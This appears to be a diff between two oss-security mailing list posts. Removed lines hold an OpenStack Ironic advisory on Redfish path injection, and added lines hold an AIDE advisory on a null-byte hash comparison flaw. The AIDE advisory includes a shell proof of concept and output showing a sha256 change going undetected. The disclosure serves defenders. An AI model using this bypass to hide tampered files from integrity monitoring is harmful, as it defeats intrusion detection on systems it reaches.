@@ -1,70 +1,138 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/10/22/6
-Message-ID: <08ae2141-eec1-4137-b45e-e21d52d8b37d@jvf.cc>
-Date: Thu, 22 Oct 2026 08:49:48 -0700
-From: Jay Faulkner <jay@....cc>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/10/22/5
+Message-ID: <20261022140255.GA2@magnesium.vonhaugwitz.com>
+Date: Thu, 22 Oct 2026 16:02:55 +0200
+From: Hannes von Haugwitz <hannes@...haugwitz.com>
 To: oss-security@...ts.openwall.com
-Subject: [OSSA-2026-047] Ironic: Redfish vendor_passthru method allows path injection via ID (CVE-2026-90458)
+Subject: aide (<= 0.19.4) improper comparison of hash values containing a null byte (AIDE detection bypass) [GHSA-6wc9-4w69-5jc5, CVE pending]
 Content-Type: text/plain; charset=utf-8
 
-==========================================================================
-OSSA-2026-047: Redfish vendor_passthru method allows path injection via ID
-==========================================================================
+Summary
+=======
 
-:Date: October 22, 2026
-:CVE: CVE-2026-90458
+It was discovered that AIDE, a host-based file and directory integrity checker,
+improperly compares hash values containing a null byte. An attacker could craft
+a malicious file with a hash value matching the existing hash in every byte up
+to and including the first 0x00 byte so that the hash change is silently
+ignored by AIDE. A local user could exploit this to bypass the AIDE detection
+of malicious files.
+
+Project
+=======
+
+AIDE (Advanced Intrusion Detection Environment)
+
+Affected versions
+=================
+
+AIDE <= 0.19.4
+
+CVE ID
+======
+
+A CVE ID has been requested, but is not yet available; please cross-reference
+this vulnerability as GHSA-6wc9-4w69-5jc5 for now. The advisory will be
+updated, as soon as a CVE ID is available.
+
+Proof of concept
+================
+
+    $ mkdir test
+    $ echo -n "00031388$(for i in {1..248} ; do printf '%c' x ; done)" > test/file
+    $ aide --config <(printf -- "root_prefix=./test\n\ndatabase_out=stdout\n/file sha256+sha512\n") --init > test/aide.db
+    $ echo -n "!0031388$(for i in {1..248} ; do printf '%c' x ; done)" > test/file
+    $ aide --config <(printf -- "root_prefix=./test\n\ndatabase_in=file:test/aide.db\n/file sha256+sha512\n") --check
+    Start timestamp: 2026-10-17 19:28:38 +0200 (AIDE 0.19.4)
+    AIDE found differences between database and filesystem!!
+    Root prefix: ./test
+
+    Summary:
+      Total number of entries:	1
+      Added entries:		0
+      Removed entries:		0
+      Changed entries:		1
+
+    ---------------------------------------------------
+    Changed entries:
+    ---------------------------------------------------
+
+    f           H      : /file
+
+    ---------------------------------------------------
+    Detailed information about changes:
+    ---------------------------------------------------
+
+    File: /file
+     SHA512    : P8b+dtBxYkuzpArlOTav0mcbnsgyK6yN | M4dh5Bf8Qq8SXttTI05UFhooBkU6TzBg
+                 GXLU29ddIz0KH8JwXFQBg1kr29WRxCf1 | IdvZInsXpytohLbiVQws60Qa+rNOn1yz
+                 CEh60upsX4R1fFjjVjZ4xA==         | yVPaQ2MEcqsMQ/CZNKy7kg==
 
 
-Affects
-~~~~~~~
-- Ironic: >=18.1.0 <=29.1.1, >30.0.0 <=32.1.1, >33.0.0 <=35.1.1, >36.0.0 
-<=39.0.1
+    ---------------------------------------------------
+    The attributes of the (uncompressed) database(s):
+    ---------------------------------------------------
+
+    test/aide.db
+     SHA256    : 7pkJPevLDacvy1SlNpDdbO2LJC9K+eVp
+                 JbiJwoPJz1c=
+     SHA512    : cE7/5LIJ45y0JrY51BqX033/PaY50qHU
+                 1UMUz7zQzILXJObOsG0C2SV2PVCQJWFx
+                 ocCjWdAy8ZOaDBX/aN9Xhw==
+     STRIBOG256: cnuQwLejgI+VBBVvl3EcHPcU+eW855Gx
+                 BJNvvVIqOk4=
+     STRIBOG512: CZa/yVLVDQQkCR+Z5Q+zO4u3nvGSRci+
+                 IOvlfUkMZuDcBu9cTfGmiPZLbnzgpRsk
+                 2Yz1t3TnRE1DhDH4Wzf/qg==
+     SHA512/256: rk6L06UvIay94ky7CEtMdmCUTEVaBMtk
+                 zK/Ojy0AoEA=
+     SHA3-256  : lU0ArehEa2V4Ovhujiz/GjsZLyNpjwhM
+                 LoLS+1HYlhY=
+     SHA3-512  : nOFvtQgHYrlT+XMCc3BqflAd6iCdbbC5
+                 1Zr4VerGXc+aOnD2E5Nrl6Z4U2Yed8RI
+                 3PUOngDqiUafGusEM+yVcQ==
 
 
-Description
-~~~~~~~~~~~
-The Metal3.io Security team reported a vulnerability in Ironic's API.
-When calling the ``vendor_passthru`` API endpoint provided by the
-``redfish`` management interface to create or delete a subscription,
-a malicious System-scoped Administrator could instead perform an HTTP
-DELETE or HTTP GET on an arbitrary path on a node's BMC. In a worst
-case scenario, this could lead to user accounts being deleted from
-the Redfish service on the BMC.
-
-Only clouds with nodes enrolled in a redfish hardware type are
-susceptible to this vulnerability.
+    End timestamp: 2026-10-17 19:28:38 +0200 (run time: 0m 0s)
 
 
+The report correctly shows the change of the `sha512` hash, but misses the
+change of the `sha256` hash.
 
-Patches
-~~~~~~~
-- https://review.opendev.org/1011870 (2024.1/caracal (unmaintained))
-- https://review.opendev.org/1011868 (2025.1/epoxy)
-- https://review.opendev.org/1011866 (2025.2/flamingo)
-- https://review.opendev.org/1011864 (2026.1/gazpacho)
-- https://review.opendev.org/1011862 (2026.2/hibiscus)
-- https://review.opendev.org/1011860 (2027.1/indri (development))
-- https://review.opendev.org/1011874 (Bugfix/37.0)
-- https://review.opendev.org/1011872 (Bugfix/38.0)
+Analysis
+========
 
+The vulnerability is caused by using `strncmp` instead of `memcmp` for
+comparing hash values in `bytecmp` function, resulting in `bytecmp` not
+comparing the entire hash value if one of the hash values contain a null byte.
 
-Credits
-~~~~~~~
-- Tuomo Tanskanen, Metal3.io Security Team from Ericsson Software 
-Technology (CVE-2026-90458)
-- Dmitry Tantsur, Metal3.io Security Team from Red Hat (CVE-2026-90458)
+In the proof of concept example above the hash values of the old and the new
+content starts with a null byte, so only the first byte (the 0x00 byte) is
+compared and the `sha256` hash value change is missed.
 
+Mitigation
+==========
+
+Upgrade to AIDE v0.19.5
+
+Alternatively apply the provided patch:
+
+aide-0.19_GHSA-6wc9-4w69-5jc5_bytecmp.patch
+
+If you cannot upgrade, consider adding multiple hash functions to your rules (the `H`
+attribute group adds all available hash functions) to increase the probability a
+content change is reported even if one hash contains a null byte.
+
+Credit
+======
+
+The issue was reported by a community member.
 
 References
-~~~~~~~~~~
-- https://launchpad.net/bugs/2166507
-- http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-90458
+==========
+[AIDE](https://aide.github.io)
+[v0.19.5](https://github.com/aide/aide/releases/tag/v0.19.5)
+[GHSA-6wc9-4w69-5jc5](https://github.com/aide/aide/security/advisories/GHSA-6wc9-4w69-5jc5)
 
+View attachment "aide-0.19_GHSA-6wc9-4w69-5jc5_bytecmp.patch" of type "text/x-diff" (459 bytes)
 
-Notes
-~~~~~
-- Patches for unmaintained/2024.1, bugfix/38.0 and bugfix/37.0 will be
-   merged to git but no new release will be provided.
-
-
-Download attachment "OpenPGP_signature.asc" of type "application/pgp-signature" (496 bytes)
+Download attachment "signature.asc" of type "application/pgp-signature" (660 bytes)
